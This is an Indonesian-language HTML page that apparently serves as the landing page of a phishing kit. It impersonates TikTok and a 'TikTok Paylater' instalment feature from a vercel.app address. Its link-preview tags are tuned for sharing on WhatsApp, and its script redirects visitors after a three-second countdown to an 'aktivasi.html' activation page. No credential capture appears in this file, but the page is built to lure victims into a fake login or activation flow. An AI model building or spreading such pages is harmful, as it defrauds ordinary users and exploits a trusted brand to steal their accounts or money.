<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masuk ke Tiktok</title>
    
    <!-- KODE AGAR TAMPILAN DI WHATSAPP LEBIH BAGUS & GAMBAR MUNCUL -->
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="TikTok Paylater" />
    <meta property="og:image" content="https://tiktok-paylater-b56i.vercel.app/logo1.jpg" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:title" content="Tiktok Paylater" />
    <meta property="og:description" content="Tiktok paylater fitur pembayaran Beli sekarang, bayar nanti yang memudahkan kamu berbelanja di TikTok Shop tanpa harus membayar penuh di awal, Pilih cicilan 3, 6, 9, atau 12 bulan sesuai keinginan mu !" />
    <meta property="og:url" content="https://tiktok-paylater-b56i.vercel.app/" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
            position: relative;
        }

        /* Style Gambar - DISESUAIKAN AGAR PAS DI LAYAR HP */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Mengisi layar penuh tanpa ada ruang kosong */
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        
    </style>
</head>
<body>

    <img id="gambarPembuka" src="tiktok1.jpg" alt="tiktok">
    <div id="timer">3</div>

    <script>
        let waktu = 3;
        let timerDisplay = document.getElementById('timer');
        
        let hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if(waktu <= 0) {
                clearInterval(hitungMundur);
                // Pindah ke halaman aktivasi.html
                window.location.href = "aktivasi.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
